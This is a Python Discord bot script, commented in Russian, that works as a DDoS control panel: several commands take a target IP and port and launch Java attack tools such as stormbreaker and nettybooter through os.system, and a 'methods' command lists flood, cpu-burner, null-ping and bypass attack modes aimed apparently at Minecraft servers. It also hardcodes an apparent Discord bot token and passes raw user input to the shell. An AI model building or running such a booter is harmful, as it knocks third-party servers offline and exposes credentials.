import discord, urllib.request, json, time, os, threading, asyncio, random
from discord.ext import commands

token = "OTkyOTg5MzU1ODA1MjY1OTYw.GmIUZ0.C3sj4XVxJ63E2hzLpHg48coozTvOf-AwLzjid4" # Токен бота!
ntents = discord.Intents().all()
client = commands.Bot(command_prefix='$') # на какой суффикс будет вызываться бот?
client.remove_command('help')
serverid = 993223784876212234 # id сервера

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound): # Ошибка команды
        print(" ")

    if isinstance(error, commands.MissingRequiredArgument): # Ошибка аргумента
        print(" ")

    if isinstance(error, commands.MissingRole): # У вас нету необходимой роли
        print(" ")

@client.command(name="stormbreakeroriginal")
async def nullping(ctx, arg1,arg2,arg3):
    if ctx.guild.id == 993223784876212234: # ID сервера
        try:
            ip = f'{arg1}' # Аргумент 1
            ip1, port = ip.split(':', 1) # Разделение arg1 на айпи и порт отдельно
            mod =  f'{arg2}'
            time = f'{arg3}'
            def attack():
                os.system(f'java -jar -Xmx3G crash originalstormbreaker.jar host={ip1}:{port} exploit={mod} attackTime={time}') # Запуск jar ddos

            t1 = threading.Thread(target=attack)
            t1.start()
        except:
            print("ErrorAttack")
            await ctx.send(f':negative_squared_cross_mark Error Syntaxis')
        else:
            print("Attack started")
            await ctx.send(f'✅ Attack Started ip:{ip}:{port}')
    else:
      await ctx.send(f':negative_squared_cross_mark Error Syntaxis')
      await ctx.send(f'Error Syntaxis')

@client.command(name="stormbreaker2")
async def nullping(ctx, arg1,arg2,arg3):
    if ctx.guild.id == 993223784876212234: # ID сервера
        try:
            ip = f'{arg1}' # Аргумент 1
            ip1, port = ip.split(':', 1) # Разделение arg1 на айпи и порт отдельно
            mod = f'{arg2}'
            time = f'{arg3}'
            def attack():
                os.system(f'java -jar -Xmx3G originalstormbreaker.jar host={ip1}:{port} exploit={mod} attackTime={time}') # Запуск jar ddos

            t1 = threading.Thread(target=attack)
            t1.start()
        except:
            print("ErrorAttack")
            await ctx.send(f':negative_squared_cross_mark Error Syntaxis')
        else:
            print("Attack started")
            await ctx.send(f'✅ Attack Started ip:{ip}:{port}')
    else:
      await ctx.send(f':negative_squared_cross_mark Error Syntaxis')

@client.command(name="laggbreaker")
async def nullping(ctx, arg1,arg2,arg3):
    if ctx.guild.id == 993223784876212234: # ID сервера
        try:
            ip = f'{arg1}' # Аргумент 1
            ip1, port = ip.split(':', 1) # Разделение arg1 на айпи и порт отдельно
            mod = f'{arg2}'
            time = f'{arg3}'
            def attack():
                os.system(f'java -jar -Xmx3G LaGgBreaker0.2.jar host={ip1}:{port} exploit={mod} attackTime={time}') # Запуск jar ddos

            t1 = threading.Thread(target=attack)
            t1.start()
        except:
            print("ErrorAttack")
            await ctx.send(f' Error Syntaxis')
        else:
            print("Attack started")
            await ctx.send(f'✅ Attack Started ip:{ip}:{port}')
    else:
      await ctx.send(f':negative_squared_cross_mark Error Syntaxis')

@client.command(name="nettybotter")
async def nullping(ctx, arg1,arg2,arg3):
    if ctx.guild.id == 993223784876212234: # ID сервера
        try:
            ip = f'{arg1}' # Аргумент 1
            ip1, port = ip.split(':', 1) # Разделение arg1 на айпи и порт отдельно
            mod = f'{arg2}'
            time = f'{arg3}'

            def attack():
                os.system(f'java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar nettybooter.jar {ip1}:{port} {mod} 2000 340 {time} socks5_proxies.txt socks5') # Запуск jar ddos
            t1 = threading.Thread(target=attack)
            t1.start()
        except:
            print("ErrorAttack")
            await ctx.send(f':negative_squared_cross_mark Error Syntaxis')
        else:
            print("Attack started")
            await ctx.send(f'✅ Attack Started ip:{ip}:{port}')
    else:
      await ctx.send(f':negative_squared_cross_mark Error Syntaxis')

@client.command(name="stormbreaker3")
async def nullping(ctx, arg1,arg2,arg3):
    if ctx.guild.id == 993223784876212234: # ID сервера
        try:
            ip = f'{arg1}' # Аргумент 1
            ip1, port = ip.split(':', 1) # Разделение arg1 на айпи и порт отдельно
            mod = f'{arg2}'
            time = f'{arg3}'

            def attack():
                os.system(f'java -jar stormkack.jar host={ip1}:{port} exploit={mod} attackTime={time} srvResolve=true threads=2000') # Запуск jar ddos
            t1 = threading.Thread(target=attack)
            t1.start()
        except:
            print("ErrorAttack")
            await ctx.send(f':negative_squared_cross_mark Error Syntaxis')
        else:
            print("Attack started")
            await ctx.send(f'✅ Attack Started ip:{ip}:{port} threads:{three} time: {time}')
    else:
      await ctx.send(f':negative_squared_cross_mark Error Syntaxis')
@client.command(name="sb")
@commands.has_guild_permissions(administrator=True)
async def sb(ctx):
    await ctx.send(f'✅ bot is working')
@client.command(name="methods")
@commands.has_guild_permissions(administrator=True)
async def sb(ctx):
    await ctx.send(f'Nettybotter - pinger(1),QuitExceptions(2), RandomExceptions(3),PacketOutOfRange(4),Joiner(5),Nullping(6),ConsoleSpammer(7)')
    await ctx.send(f'Stormbreaker2 - flood2, flood1, cpuburner1, cpuburner2, cpuburner3, test1, spigot2, spigot1, cpuburner4, cpuburner5, cpuburner6, Destroyer, localhost, extreme4, ZeusSlapper, bosshandler, exceptionBypass, cpulagger, extreme2, Extreme5, extreme3, extreme1, AuthSmasher, test2, BypassHub1, bypass1, bypass3, bypass2')
    await ctx.send(f'Stormbreaker3 - bypass, bots, luminu, test, auth, ping, aegis, ramoverload, join1, exceptionbypass, instant')
    await ctx.send(f'stormbreakeroriginal - cpu-burner2, flood2, cpu-burner1, flood3, cpu-burner4, cpu-burner3, cpu-burner5, yooniksbypass, bosshandler, yooniksbypass2, 1, spigot2, spigot1, 2, cpu-lagger1')
    await ctx.send(f'laggbreaker - cpu-burner2, flood2, cpu-burner1, flood3, cpu-burner4, cpu-burner3, cpu-burner5, yooniksbypass, bosshandler, yooniksbypass2, 1, spigot2, spigot1, 2, mcspam')
client.run(token)
